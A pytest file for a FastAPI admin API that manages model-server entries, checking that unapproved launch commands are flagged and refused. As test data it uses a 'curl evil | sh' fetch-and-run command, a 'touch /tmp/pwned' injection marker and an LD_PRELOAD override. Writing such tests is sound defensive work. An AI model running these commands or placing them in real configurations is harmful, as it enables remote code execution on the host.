import json
import sys

import pytest
from fastapi.testclient import TestClient

from api import app as app_module
from config import Config
from models import model_server
from models.server_specs import ServerStore, new_commands, parse_entry
from tests.test_model_server import CMD, clean_registry  # noqa: F401  (clean_registry: autouse)

FILE = f"""
[providers.ollama]
url = "http://127.0.0.1:9"

[models."local/chat"]
task = "text-generation"
cmd = {json.dumps(list(CMD))}
description = "From the file"

[models."broken"]
task = "nope"
"""


@pytest.fixture
def files(tmp_path, monkeypatch):
    file, saved = tmp_path / "model_servers.toml", tmp_path / "saved.json"
    file.write_text(FILE)
    monkeypatch.setattr(Config, "MODEL_SERVERS_FILE", file)
    monkeypatch.setattr(Config, "MODEL_SERVERS_SAVED_FILE", saved)
    monkeypatch.setattr(Config, "MODEL_SERVERS_ALLOW_COMMANDS", False)
    return file, saved


@pytest.fixture
def client(files):
    with TestClient(app_module.app) as c:
        model_server.load_configured()
        yield c


def test_saved_entries_replace_the_files_and_deleting_brings_them_back(files):
    file, saved = files
    store = ServerStore(file, saved)
    effective = store.effective()
    assert effective.models["local/chat"].description == "From the file"
    assert "file: models.broken" in effective.problems and "broken" not in effective.models

    store.save_model(parse_entry("local/chat", {"task": "text-generation", "backends": [
        {"provider": "ollama", "upstream_model": "qwen3.5:4b"}, {"cmd": list(CMD)},
    ]}))
    effective = store.effective()
    assert effective.origin("models", "local/chat") == "replaced"
    assert effective.users("ollama") == ["local/chat"]
    # Saved as given: the provider's settings stay inherited.
    assert json.loads(saved.read_text())["models"]["local/chat"]["backends"][0] == {
        "provider": "ollama", "upstream_model": "qwen3.5:4b",
    }
    assert store.delete_model("local/chat") and store.effective().origin("models", "local/chat") == "file"


def test_only_commands_already_given_count_as_known():
    file_entry = parse_entry("m", {"task": "text-generation", "cmd": "mlx_lm.server --port {port}"})
    same = parse_entry("m", {"task": "text-generation", "backends": [{"url": "http://x"}, {"cmd": "mlx_lm.server --port {port}"}]})
    other = parse_entry("m", {"task": "text-generation", "cmd": "sh -c 'curl evil | sh'"})
    with_env = parse_entry("m", {"task": "text-generation", "cmd": "mlx_lm.server --port {port}", "env": {"LD_PRELOAD": "x"}})
    assert new_commands(same, file_entry, None) == []
    assert new_commands(other, file_entry, None) == ["sh -c 'curl evil | sh'"]
    assert new_commands(with_env, file_entry) == ["mlx_lm.server --port '{port}'"]


def test_listing_shows_entries_their_origin_and_problems(client):
    body = client.get("/admin/model-servers").json()
    assert body["editable"] is True and body["commands_allowed"] is False
    [chat] = body["models"]
    assert (chat["model_id"], chat["origin"], chat["status"]) == ("local/chat", "file", "unloaded")
    assert chat["backends"] == [{"cmd": list(CMD)}]
    assert body["providers"][0]["name"] == "ollama" and body["providers"][0]["used_by"] == []
    assert [p["where"] for p in body["problems"]] == ["file: models.broken"]


def test_dashboard_adds_a_provider_and_a_model_on_it(client):
    r = client.put("/admin/model-servers/providers/lmstudio", json={"url": "http://127.0.0.1:1234", "max_concurrency": 2})
    assert r.status_code == 200, r.text
    r = client.put("/admin/model-servers/models/qwen3.5-4b", json={
        "task": "vision-language", "backends": [{"provider": "lmstudio", "upstream_model": "qwen/qwen3.5-4b"}],
    })
    assert r.status_code == 200, r.text
    model = next(m for m in r.json()["models"] if m["model_id"] == "qwen3.5-4b")
    assert model["origin"] == "saved" and model["backends"] == [{"provider": "lmstudio", "upstream_model": "qwen/qwen3.5-4b"}]
    # Served at once: listed for its task, and allowed.
    assert "qwen3.5-4b" in client.get("/models/list").json()["vision-language"]
    assert model_server.configured("qwen3.5-4b")
    # The provider is in use, so it cannot go.
    assert client.delete("/admin/model-servers/providers/lmstudio").status_code == 409
    assert client.delete("/admin/model-servers/models/qwen3.5-4b").status_code == 200
    assert client.delete("/admin/model-servers/providers/lmstudio").status_code == 200
    assert not model_server.configured("qwen3.5-4b")


def test_dashboard_cannot_add_commands_unless_allowed(client, monkeypatch):
    entry = {"task": "text-generation", "backends": [{"cmd": ["sh", "-c", "touch /tmp/pwned"]}]}
    r = client.put("/admin/model-servers/models/evil", json=entry)
    assert r.status_code == 403 and "MODEL_SERVERS_ALLOW_COMMANDS" in r.json()["detail"]
    # The file's own command can be kept, here behind a new first backend.
    r = client.put("/admin/model-servers/models/local/chat", json={"task": "text-generation", "backends": [
        {"provider": "ollama", "upstream_model": "x"}, {"cmd": list(CMD)},
    ]})
    assert r.status_code == 200, r.text
    monkeypatch.setattr(Config, "MODEL_SERVERS_ALLOW_COMMANDS", True)
    assert client.put("/admin/model-servers/models/evil", json=entry).status_code == 200


def test_unknown_provider_and_file_only_entries_are_refused(client):
    r = client.put("/admin/model-servers/models/m", json={"task": "text-generation", "backends": [{"provider": "nope"}]})
    assert r.status_code == 400 and "nope" in r.json()["detail"]
    assert client.delete("/admin/model-servers/models/local/chat").status_code == 400
    assert client.delete("/admin/model-servers/providers/ollama").status_code == 400
    assert client.put("/admin/model-servers/models/m", json={"task": "text-generation", "backends": []}).status_code == 422


def test_an_edit_unloads_the_model_so_it_loads_from_the_new_entry(client):
    chat = {"model": "local/chat", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 8}
    r = client.post("/v1/chat/completions", json=chat)
    assert r.status_code == 200, r.text
    assert r.json()["toolkit"]["backend"] == f"{CMD[0].rsplit('/', 1)[-1]}: local/chat"
    r = client.put("/admin/model-servers/models/local/chat", json={
        "task": "text-generation", "backends": [{"cmd": list(CMD), "upstream_model": "renamed"}],
    })
    assert r.status_code == 200, r.text
    assert any("local/chat was unloaded" in n for n in r.json()["notes"])
    r = client.post("/v1/chat/completions", json=chat)
    assert "model=renamed" in r.json()["choices"][0]["message"]["content"]


def test_probe_reports_each_backend_of_a_draft(client):
    r = client.post("/admin/model-servers/probe", json={"model_id": "draft", "entry": {
        "task": "text-generation",
        "backends": [{"provider": "ollama"}, {"cmd": ["no-such-model-server"]}, {"cmd": [sys.executable]}],
    }})
    assert r.status_code == 200, r.text
    body = r.json()
    assert [b["state"] for b in body["backends"]] == ["unavailable", "unavailable", "ok"] and body["chosen"] == 2
    assert body["backends"][0]["detail"] == "nothing answers at http://127.0.0.1:9"
    assert client.post("/admin/model-servers/probe", json={"model_id": "unknown"}).status_code == 404


def test_no_backend_answers_503(client):
    client.put("/admin/model-servers/models/down", json={"task": "text-generation", "backends": [{"provider": "ollama"}]})
    r = client.post("/v1/chat/completions", json={"model": "down", "messages": [{"role": "user", "content": "hi"}]})
    assert r.status_code == 503 and "nothing answers" in r.json()["detail"]
